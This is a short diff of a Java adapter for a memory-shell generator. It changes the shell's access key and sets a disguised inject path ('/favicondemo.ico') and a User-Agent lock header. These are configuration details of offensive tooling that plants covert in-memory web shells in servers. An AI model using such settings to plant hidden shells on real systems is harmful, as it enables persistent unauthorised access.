@@ -75,7 +75,7 @@ public class JmgMemshellGeneratorAdapter implements MemshellGeneratorAdapter {
         invokeOptionalSetter(configClass, config, "setInjectPattern", "/favicondemo.ico");
         invokeOptionalSetter(configClass, config, "setLockHeaderKey", "User-Agent");
         invokeOptionalSetter(configClass, config, "setLockHeaderValue", "Mozilla/5.0");
-        invokeOptionalSetter(configClass, config, "setKey", "3c6e0b8a9c15224a");
+        invokeOptionalSetter(configClass, config, "setKey", "key");
         invokeOptionalSetter(configClass, config, "setName", "shell");
     }
 
